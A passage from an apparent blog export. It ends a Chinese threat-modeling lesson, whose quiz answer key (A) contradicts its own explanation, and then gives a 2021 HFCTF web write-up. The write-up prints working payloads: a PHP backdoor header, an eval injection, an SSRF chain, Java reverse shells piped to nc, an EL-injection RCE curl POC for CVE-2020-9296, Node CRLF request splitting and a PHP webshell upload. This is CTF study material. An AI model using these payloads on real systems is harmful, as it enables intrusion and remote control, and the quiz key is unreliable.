某些模板只包含威胁，但较新版本确实包含风险降低策略。 VisioVisio 归为 Microsoft 所有，其功能强大，可帮助任何人创建优质的流程图和数据流关系图。 优点Visio 提供拖放功能和关系图批注功能。 在为系统创建关系图时，这两种功能都很有用。 缺点该应用程序不提供自动威胁建模功能。 因此，没有威胁生成引擎来帮助工程师集体讨论威胁和风险降低策略。 如果使用 Visio，你将负责对每个元素和交互进行手动威胁建模。 知识检查 Visio 不提供哪些优势？ A. 使用默认模具提供拖放功能。 B. 输出一系列生成的威胁，帮助工程师集体讨论可以如何降低或消除风险。 C. 让工程师可以为数据流图表添加批注以提供服务上下文。 参考答案：== A == 解释：A. 它确实提供拖放功能。B. Visio 没有威胁生成引擎。C. 它提供批注功能。 小结你可以使用任何画布（物理的或虚拟的）来创建数据流关系图。 Microsoft 的工程师推荐几个工具来帮助你进行威胁建模。 你了解了可用于创建数据流关系图的不同工具。 在本模块中，你已经学习了以下内容： 详细了解了 Threat Modeling Tool 详细了解了 Visio 还有很多其他工具可以帮助你解决威胁建模需求。 其中某些工具需要付费订阅才能使用，另一些则完全开放源代码。 你甚至可以使用白板，其学习难度较低，但以威胁建模专业知识为使用前提，并且难以保存。 了解详细信息Threat Modeling Toolhttps://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool Visiohttps://www.microsoft.com/en-us/microsoft-365/visio/flowchart-software 完结撒花~ ~","categories":[{"name":"SDL","slug":"SDL","permalink":"https://tari.moe/categories/SDL/"},{"name":"威胁建模","slug":"SDL/威胁建模","permalink":"https://tari.moe/categories/SDL/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"}],"tags":[{"name":"SDL","slug":"SDL","permalink":"https://tari.moe/tags/SDL/"},{"name":"威胁建模","slug":"威胁建模","permalink":"https://tari.moe/tags/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"}]},{"title":"2021HFCTF Web Writeup","slug":"2021hfctf","date":"2021-04-03T09:47:20.000Z","updated":"2021-05-06T09:02:00.919Z","comments":true,"path":"2021/04/03/2021hfctf/","link":"","permalink":"https://tari.moe/2021/04/03/2021hfctf/","excerpt":"","text":"internal_system 挺有意思的，复现完学到了刷多 （ 签到题考点：PHP供应链攻击 php 近期爆的漏洞，一开始就看到了， 喔？你说这个我可就不困了，（我是个爱看新闻的好孩子 逃 但是，，User-Agentt 看成了 User-Agent，，没成，然后被另一个地方吸住了眼球，在搞 guestbook.php 草。。 直到官方放出提示，我不信邪在看了一遍 1user-agentt: zerodiumsystem(&quot;cat &#x2F;flag&quot;); unsetme考点：CVE-2020-5203 补丁绕过 源码 123456789101112131415&lt;?php// Kickstart the framework$f3=require(&#x27;lib/base.php&#x27;);// $f3 = Base::instance();$f3-&gt;set(&#x27;DEBUG&#x27;,1);if ((float)PCRE_VERSION&lt;8.0) trigger_error(&#x27;PCRE version is out of date&#x27;);// Load configurationhighlight_file(__FILE__);$a=$_GET[&#x27;a&#x27;];unset($f3-&gt;$a);$f3-&gt;run(); 也是有故事 开开心心本地分析了一波弄出来了，线上一打，啥返回都没= =，，我在想.. 你这不是考察 CVE-2020-5203 根据 3.7.2的代码修改记录 https://github.com/bcosca/fatfree-core/commit/dae95a0baf3963a9ef87c17cee52f78f77e21829 来写 3.7.1 的exp么？ 你不是。。3.7.2 吧？晕，于是想办法找，找到了 changlog 来确定版本 1lib&#x2F;CHANGELOG.md 草，慢慢分析吧，其实漏洞触发点是类似的 由上两图，$f3 是 Base 实例，这个类重载了 __unset 魔术方法，然后这个 $key 参数是可控的 也就是说，调用 unset($f3-&gt;$a); 会触发该魔术方法，跟进 $this-&gt;offsetunset 方法，调用 $this-&gt;clear 方法 继续跟进， 刚刚说到，这个 $key 参数是可控的，也就是说，这个 eval 里的 $val 是可控的 问题是，3.7.2 版本打过补丁， $this-&gt;compile 方法和之前的不同，如果用 3.7.1 版本的exp 打，断点调试，会发现最终 $val 构造出来是类似于 &quot;[&#39;xxx;eval_code&#39;]&quot; ，无论怎样都会被包括在引号里的。 先传入 /?a=s 右边红框框住的部分和原本有点不一样，就是把写在一起的提取出来，赋值到变量里方便查看变化 经过 $this-&gt;compile 预处理值 $pre 为 $hive[&#39;s&#39;] ， 要后被 eval 的部分 $pinjie 为 &quot;unset($this-&gt;hive[&#39;s&#39;]);&quot; 。 到这里我们明白了大概的数据流，即设法构造 $_GET[&#39;a&#39;] 使我们的恶意代码可以被 eval 这里绕过有两个点 数组闭合 注释闭合多余部分 继续尝试构造传入 a=s[]); 可以看到 $pre 部分已经成功被闭合了，但是有个问题， $pinjie 部分拼接不正常 unset($this-&gt;hive[&#39;s&#39;][&#39;&#39;]); 这部分正常，但多了 ); 至于为什么我这么熟练，直接用数组给闭合了，，因为一开始，，在分析 3.7.1 时，把代码流，包括 $this-&gt;compile 部分给整明白了，然后 3.7.2 重构了 $this-&gt;compile 很类似，有兴趣可以去看看，就是正则有点多和复杂。。。看的头皮发麻 尝试传入 a=s[]);phpinfo();// 这样，反正后面多了的 ); 会被注释掉（好像和我新年出的 CTF 有点像，要闭合加注释），断点看看呗 然后线上环境 cat 一下就好了 “慢慢做” 管理系统没做出来，写思路，后续补上 提示 第一步登录的sql语句是”SELECT * FROM users WHERE password = ‘“.md5($password,true).”‘ limit 0,1”; 元老级 md5($password,true) 绕过，以前实验吧刷过，可以看以下链接 https://blog.csdn.net/March97/article/details/81222922 但是。。黑人问号.jpg 好，你说题目描述重要 这个sql吧，有点ssrf的样子，首页是一个很普通的sql注入，没有什么花样，但是我的admin.php是一个内网的管理系统，只要你用“真-admin”的密码登录了，就可以拿到flag，反正慢慢做就对了，不要急躁，静下心。 完全不知道 ssrf 的点在哪，一共就发现 index.php admin.php 和 flag.php 三个文件，好了，没思路了。（还是太菜了 emm，看来别人的wp，发现原来，，除了 ffifdyop 还有其他的，晕…. 坐等 buu 出复现 （ 5月6更 buu 群问了下，说不会出复现环境了，参考其他师傅的题解吧~ https://www.zhaoj.in/read-6885.html#WEB1 internal_system没做出来，但是感觉接近了 admin/admin 一把梭， 密码竟然是错的，不过有提示 访问 /source 获取源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149const express = require(&#x27;express&#x27;)const router = express.Router()const axios = require(&#x27;axios&#x27;)const isIp = require(&#x27;is-ip&#x27;)const IP = require(&#x27;ip&#x27;)const UrlParse = require(&#x27;url-parse&#x27;)const &#123;sha256, hint&#125; = require(&#x27;./utils&#x27;)const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;))const port = process.env.PORT || 3000function formatResopnse(response) &#123; if(typeof(response) !== typeof(&#x27;&#x27;)) &#123; return JSON.stringify(response) &#125; else &#123; return response &#125;&#125;function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125;function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125;function OTHER_WAF(url) &#123; return true;&#125;const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] router.get(&#x27;/&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/login&#x27;, (req, res, next) =&gt; &#123; const &#123;username, password&#125; = req.query; if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; res.render(&#x27;login&#x27;) &#125; else &#123; const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/index&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.render(&#x27;index&#x27;, &#123;admin: req.session.admin&#125;) &#125;&#125;)router.get(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) &#123; res.render(&#x27;base&#x27;, &#123;title: &#x27;WAF&#x27;, content: &quot;Here is the waf...&quot;&#125;) &#125; else &#123; try &#123; const response = await axios.get(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, response.data) &#125; catch(error) &#123; res.render(&#x27;base&#x27;, error.message) &#125; &#125;&#125;) router.post(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; // test url // not implemented here const url = &quot;https://postman-echo.com/post&quot; await axios.post(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, &quot;Something needs to be implemented&quot;)&#125;)router.all(&#x27;/search&#x27;, async (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;You can only use proxy to aceess here!&#x27;&#125;) &#125; const result = &#123;title: &#x27;Search Success&#x27;, content: &#x27;&#x27;&#125; const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try &#123; if(method == &#x27;get&#x27;) &#123; const response = await axios.get(url) result.content = formatResopnse(response.data) &#125; else if(method == &#x27;post&#x27;) &#123; const response = await axios.post(url, data) result.content = formatResopnse(response.data) &#125; else &#123; result.title = &#x27;Error&#x27; result.content = &#x27;Unsupported Method&#x27; &#125; &#125; catch(error) &#123; result.title = &#x27;Error&#x27; result.content = error.message &#125; return res.json(result)&#125;)router.get(&#x27;/source&#x27;, (req, res, next)=&gt;&#123; res.sendFile( __dirname + &quot;/&quot; + &quot;route.js&quot;);&#125;)router.get(&#x27;/flag&#x27;, (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;No Flag For You!&#x27;&#125;) &#125; return res.json(&#123;hint: hint&#125;)&#125;)module.exports = router 查看 login 方法，也就是要满足以下条件 1if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) 和 1req.session.admin = hash === adminHash 其中我们传入的为 1const hash = sha256(sha256(salt + username) + sha256(salt + password)) 然后见代码 13 和 15行 123const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;)) 也就是说，用户名和密码都要是 admin 但是，，他们长度和内容不一样 = =，好，非常好，还好 js 有的特性和 PHP 有点类似，username 用数组即可绕过 登录成功后，我们要想办法访问 /flag 接口，不过必须为内网 ip 123456router.get(&#x27;/flag&#x27;, (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;No Flag For You!&#x27;&#125;) &#125; return res.json(&#123;hint: hint&#125;)&#125;) 代码里提供 /proxy 接口可以代理访问，然后这个接口是本机访问的，所以可以跳过这个限制 绕过点1 12345function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125; 你传入的要是ip，，不能是域名，而且，ip必须是公网ip，其实这个好办，整个公网服务器，然后 写入代码重定向即可 至于为啥在这里写 /flag 是因为内部代理请求不会触发这个waf 机制 绕过点2 1234function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125; 构造一下 即可得到提示， 大概意思是他们在内网部署了 netflix conductor 服务器，让我们 SSRF 一下，这里熟悉 docker 的 果果 同学跟我说题目都是 docker 搭建的，会不会，，这个 netflix 服务也是 docker 来的呢？ 膜拜.jpg ，至于为什么知道是 8080 端口，搜一下 netflix 官方部署文档，就 8080 和 5000 两个端口。 当然，这里还有小差曲，我一开始暴力破解，，内网ip 和 端口，直接把它给弄宕机了。。。 源码有点长，提取关键部分 1234567891011121314151617window.swaggerUi = new SwaggerUi(&#123; url: url + &quot;/api/swagger.json&quot;, dom_id: &quot;swagger-ui-container&quot;, supportedSubmitMethods: [&#x27;get&#x27;, &#x27;post&#x27;, &#x27;put&#x27;, &#x27;delete&#x27;, &#x27;patch&#x27;], onComplete: function(swaggerApi, swaggerUi)&#123; window.swaggerUi.api.setBasePath(&quot;/api&quot;); if(typeof initOAuth == &quot;function&quot;) &#123; initOAuth(&#123; clientId: &quot;your-client-id&quot;, clientSecret: &quot;your-client-secret-if-required&quot;, realm: &quot;your-realms&quot;, appName: &quot;your-app-name&quot;, scopeSeparator: &quot; &quot;, additionalQueryStringParams: &#123;&#125; &#125;); &#125; 访问这个 json 文件 然后到这就卡住了 网上搜了一下 CVE， https://xz.aliyun.com/t/7889 毕竟 SSRF 常见都是和 Redis 之类的的，一般都是公开漏洞，然后接口好像也可以正常访问 正打算看看能不能 CRLF 啥的，看看能不能发送 POST 请求过去利用 CVE，但突然就访问不了了，，， 不知道思路是不是跑偏了，然后被举办方给看到了 ，就直接卡了，然后就没啥时间了，也没来得及试其他的，坐等 wp，我很好奇.jpg 4月22日更 好了，原来思路没有跑偏，我们继续（刚肝完论文 不过在 buu 的复现环境里直接给出了netflix 的内网ip，不用我们猜docker网段然后爆破，我们直接fuzz下图3个网段 8080端口即可 最近刷了一些SSRF题，发现还可以用 0.0.0.0 的方式去绕过 IP 限制，访问 0.0.0.0 默认是解析到本机上的，然后恰好 nodejs 的 IP.isPublic(host) 函数会把他视为公网IP。 注意fuzz线程不能太高，不然服务容易崩，最终发现netflix在 10.0.219.14:8080 现在网上搜了一下，发现有多个的漏洞，所以先确认一下 netflix 的版本， 先请求一下根路径发现源码有中暴露的api路径 1/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080 请求一下会返回json格式内容 1/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/swagger.json 复制json 格式化一下发现 admin config 就在第一处，， 请求一下 1/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/admin/config 发现 netflix 版本为 2.26.0，网上查了下，只发现 2.25.3 版本的漏洞 看了一下 commit 记录，发现这个版本已经修了的 看了一下大佬的复现，发现思路是对了，CRLF POST 利用 netflix 的 CVE https://xz.aliyun.com/t/9423 https://www.zhaoj.in/read-6905.html 经过这次比赛，发现，有时候版本不对就先试试临近版本，看看能不能死马当活马医 （ 首先要复现 CVE-2020-9296，先保证在本地能正常利用。 CVE-2020-9296 复现漏洞分析先搭建一下环境，复现一下 回到上面的 https://xz.aliyun.com/t/7889 链接 Netflix Conductor uses Java Bean Validation (JSR 380) custom constraint validators. When building custom constraint violation error messages, different types of interpolation are supported, including Java EL expressions. If an attacker can inject arbitrary data in the error message template being passed to ConstraintValidatorContext.buildConstraintViolationWithTemplate() argument, they will be able to run arbitrary Java code. 本次漏洞成因在于自定义约束冲突时的错误信息支持了 Java EL 表达式。如果攻击者可以控制ConstraintValidatorContext.buildConstraintViolationWithTemplate() 函数的参数，那么可以通过注入 Java EL 表达式进行任意代码执行。 源码代码下载：https://codeload.github.com/Netflix/conductor/zip/refs/tags/v2.25.0 全局搜一下 buildConstraintViolationWithTemplate( 发现多处有用到，并且参数利用 String.format(0) 生成的格式化字符串，格式化过程中存在用户可控的变量 taskDef.getName() 至于怎么发现的 TaskTimeoutConstraint.java 文件存在可利用点，可能排查起来就需要些时间和耐心了，这里跟着来先。 下一步继续关注 TaskTimeoutConstraint.java 在哪被使用，定位到 common/src/main/java/com/netflix/conductor/common/metadata/tasks/TaskDef.java 文件，其实也有多处引用，。找漏洞利用点的大佬辛苦了~ 可以看到 TaskTimeoutConstraint 注解到了 TaskDef 类上，那么下一步进行看 TaskDef 类会在哪里被使用，继续搜索全局引用，可以看到 jersey/src/main/java/com/netflix/conductor/server/resources/MetadataResource.java 会把该类和路由 /api/metadata/taskdefs 绑定，即我们通过请求该路由，即可获得 TaskDef 对象。 https://netflix.github.io/conductor/labs/beginner/ 官方给出的访问 API 稍微修改后如下 123456789101112131415curl -X POST \\ http://localhost:8080/api/metadata/taskdefs \\ -H &#x27;Content-Type: application/json&#x27; \\ -d &#x27;[ &#123; &quot;name&quot;: &quot;verify_if_idents_are_added&quot;, &quot;retryCount&quot;: 3, &quot;retryLogic&quot;: &quot;FIXED&quot;, &quot;retryDelaySeconds&quot;: 10, &quot;timeoutSeconds&quot;: 180, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;, &quot;responseTimeoutSeconds&quot;: 300, &quot;ownerEmail&quot;: &quot;type your email here&quot; &#125;]&#x27; 所以漏洞最终的利用逻辑如下： 通过 POST 请求访问 URL /api/metadata/taskdefs 创建 TaskDef 对象 根据官方API给出的demo稍微修改后，参数中的 timeoutSeconds 和 responseTimeoutSeconds 满足了 taskDef.getTimeoutSeconds() &gt; 0 以及 taskDef.getResponseTimeoutSeconds() &gt; taskDef.getTimeoutSeconds() 这两个条件，TaskTimeoutValidator 校验失败，TaskDef 的 name 属性作为错误信息的一部分通过 buildConstraintViolationWithTemplate(0) 输出 由于 name 是我们构造好的 Java EL 表达式，所以最后该表达式会被执行，进而成功触发远程代码执行 漏洞利用还自带 docker-compose.yaml 也太贴心了吧 （ 由于刚刚下载的就是2.25.0版本，所以直接切到 docker 目录，在 up 一下就好 12cd dockerdocker-compose up -d 如果期间有下载错误啥的，可以尝试代理或者 up 多几下。 注意事项无论下面是自己写 BCEL 还是 直接用现有的工具，都要注意 Java的版本，我本地用的是 1.8.0_144 版本。 这里还篇有趣的文章，BCEL ClassLoader去哪了 ，我感觉和这个有关，2333 据网上看，好像保证 Java 版本 &lt; Java 8u261 即可。 自己写一个，熟悉一下BCEL依赖下载地址： https://jar-download.com/artifacts/org.apache.servicemix.bundles/org.apache.servicemix.bundles.jaxp-ri/1.4.5_1/ Main.java 123456789101112import com.sun.org.apache.bcel.internal.Repository;import com.sun.org.apache.bcel.internal.classfile.Utility;import com.sun.org.apache.bcel.internal.classfile.JavaClass;public class Main &#123; public static void main(String[] args) throws Exception &#123; JavaClass cls = Repository.lookupClass(Exp.class); String code = Utility.encode(cls.getBytes(), true); System.out.println(&quot;$$BCEL$$&quot; + code); &#125;&#125; Exp.java 12345678910public class Exp &#123; public static void main(String[] args) &#123; &#125; public Exp() throws Exception&#123; Runtime.getRuntime().exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;监听IP&gt; &lt;监听端口&gt; &gt;/tmp/f&quot;); &#125;&#125; 这个POC我在本机可以打成功，但是通过 curl 打实际docker环境 shell 就反弹不回来，然后也试了各种方法 sh 反弹方法，毕竟是 docker最简环境嘛，一般里面除了 sh 能用其他基本没啥了。 然后突然想起之前看到这篇酒仙桥的文章，他遇到的情形和我一样。然后通过 java 编写 socket 的思路来反弹shell，这样可以不依赖于具体的系统环境。 真 Exp.java 12345678910111213141516171819202122232425262728293031323334import java.net.Socket;import java.io.InputStream;import java.io.OutputStream;public class Exp &#123; public Exp() throws Exception &#123; String host=&quot;&quot;; // // nc监听IP int port=; // nc监听端口，注意是整型不是字符串 String cmd=&quot;/bin/sh&quot;; // 如果是 windows 就换成 cmd.exe Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed())&#123; while(pi.available()&gt;0) so.write(pi.read()); while(pe.available()&gt;0) so.write(pe.read()); while(si.available()&gt;0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try &#123; p.exitValue(); break; &#125;catch (Exception e)&#123; &#125; &#125;; p.destroy(); s.close(); &#125;&#125; 当然可以不反弹shell，可以通过 wget 之类的方式下载到本地在加载， 不过就是想复现一下，万一以后遇到了 HTTP 不出网呢 （ 结构如下 BCEL编码后的恶意代码 直接用现有工具https://github.com/f1tz/BCELCodeman 也是先写好 exp，然后 1javac Exp.java -d /tmp/Exp.class BCEL编码后的恶意代码 1java -jar BCELCodeman.jar e /tmp/Exp.class 构造POC得到编码后构造 POC ，主要是替换 name 部分为 EL表达式，内容为 com.sun.org.apache.bcel.internal.util.ClassLoader 加载器加载BCEL编码后的恶意代码 12345678910111213141516curl -X POST \\ http://localhost:8080/api/metadata/taskdefs \\ -H &#x27;Content-Type: application/json&#x27; \\ -d &#x27;[ &#123; &quot;name&quot;: &quot;$&#123;&#x27;\\&#x27;&#x27; &#x27;\\&#x27;&#x27;.getClass().forName(&#x27;\\&#x27;&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;\\&#x27;&#x27;).newInstance().loadClass(&#x27;\\&#x27;&#x27;&lt;刚刚生成的BCEL编码&gt;&#x27;\\&#x27;&#x27;).newInstance().class&#125;&quot;, &quot;ownerEmail&quot;: &quot;test@example.org&quot;, &quot;retryCount&quot;: 3, &quot;retryLogic&quot;: &quot;FIXED&quot;, &quot;retryDelaySeconds&quot;: 10, &quot;timeoutSeconds&quot;: 180, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;, &quot;responseTimeoutSeconds&quot;: 300, &quot;ownerEmail&quot;: &quot;type your email here&quot; &#125;]&#x27; 成功反弹shell 根据漏洞相关的 pull requests：https://github.com/Netflix/conductor/pull/1543 可以定位对该漏洞的修复 开发者将 org.hibernate:hibernate-validator 替换为了 org.apache.bval:bval-jsr，而后者在最新版本下不会解析 Java EL 表达式，所以也不会有 RCE 的危险。 好，本地复现成功，把这个 POC 直接打线上，估计问题不大 回到题目中现在漏洞是可以尝试去利用了，问题是，题目只提供 GET 的代理，无法发送 POST 请求。 继续沿着一开始的思路走，CRLF SSRF guguru了一下，nodejs CRLF 漏洞，发现还真有2333 这篇写的比较详细，跟着复现一下 https://mp.weixin.qq.com/s/X6dq1WsKcEjNVwSJKiBMvA 然后看了别人的复现，发现有一个比较隐秘的提示。。 1const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27; 中间藏了个 8，， nodejs8 is best，2333 不过不伤大雅，眼睛不好网上搜一下也可以知道 nodejs HTTP库包含了阻止CRLF的措施，普通 CRLF不管用，但可以通过 nodejs 的设计不严谨问题来绕过。当然这个问题在 nodejs10 被修复了，如果请求路径包含非Ascii字符，则会抛出错误。 nodejs &lt; 9版本 CRLF注入对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击： 接受来自用户输入的Unicode数据 并将其包含在HTTP请求的路径中 且请求具有一个0长度的主体（比如一个 GET 或者 DELETE） 由于本机是 node10+，所以docker拉个镜像， 1docker pull node:8.8.0-alpine 进入容器的node环境，然后试试普通的 CRLF 1234/ # node&gt; var http = require(&quot;http&quot;);&gt; http.get(&#x27;http://192.168.123.37:2233/\\r\\nwhoami&#x27;).output[ &#x27;GET /%0D%0Awhoami HTTP/1.1\\r\\nHost: 192.168.123.37:2233\\r\\nConnection: close\\r\\n\\r\\n&#x27; ] 返回包 1234&gt; nc -lv 0.0.0.0 2233GET /%0D%0Awhoami HTTP/1.1Host: 192.168.123.37:2233Connection: close nodejs Unicode 字符损失原理 当 Node.js v8 或更低版本对URL发出的 GET 请求进行处理时，它不会进行编码转义，因为它们不是HTTP控制字符，但HTTP请求返回的结果中会被编码为 latin1 编码写入路径，但 latin1 编码为单字节编码（编码范围为 0x00 - 0xFF ，其中 0x00 - 0x7F之间完全和ASCII一致，0x80 - 0x9F之间是控制字符，0xA0 - 0xFF之间是文字符号 ），如果此时我们用单字节 8位 Unicode 编码，那么高 4 位会被截断。 构造请求 12&gt; http.get(&#x27;http://192.168.123.37:2233/\\u&#123;220D&#125;\\u&#123;330A&#125;tari&#x27;).output[ &#x27;GET /∍㌊tari HTTP/1.1\\r\\nHost: 192.168.123.37:2233\\r\\nConnection: close\\r\\n\\r\\n&#x27; ] 返回包 12345&gt; nc -lv 0.0.0.0 2233GET /tari HTTP/1.1Host: 192.168.123.37:2233Connection: close 观察 \\u&#123;220D&#125; 和 \\u&#123;330A&#125; ，其中 22 和 33 随意，什么都行，因为最终高 4 位都会被截断，然后 0D 和 0A 分别为 \\r 和 \\n 的 ASCII码，然后Latin1是向下兼容ASCII码的，所以返回包被 \\r\\n 截断了， tari 变在第二行 可见，可以通过构造 Unicode字符，在 nodejs 实现 CRLF注入。 在实际使用时，因为 CRLF + SSRF 点 在 HTTP 状态行，所以要注意闭合原有的状态行中的 HTTP/1.1，即保证注入后有正常的 HTTP 状态行， 先举个例子，假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求： 12345678910111213141516171819202122232425POST /upload.php HTTP/1.1Host: 127.0.0.1Content-Length: 437Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4Connection: close------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;100000------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;Content-Type: application/octet-stream&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;Upload&quot;Upload------WebKitFormBoundaryjDb9HMGTixAA7Am6-- 为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示： 1234567891011121314151617181920212223242526272829303132333435363738394041payload = &#x27;&#x27;&#x27; HTTP/1.1POST /upload.php HTTP/1.1Host: 127.0.0.1Content-Length: 437Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4Connection: close------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;100000------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;Content-Type: application/octet-stream&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;Upload&quot;Upload------WebKitFormBoundaryjDb9HMGTixAA7Am6--GET / HTTP/1.1test:&#x27;&#x27;&#x27;.replace(&quot;\\n&quot;,&quot;\\r\\n&quot;)def payload_encode(raw): ret = u&quot;&quot; for i in raw: ret += chr(0x0100+ord(i)) return retpayload = payload_encode(payload)print(payload)# 输出: 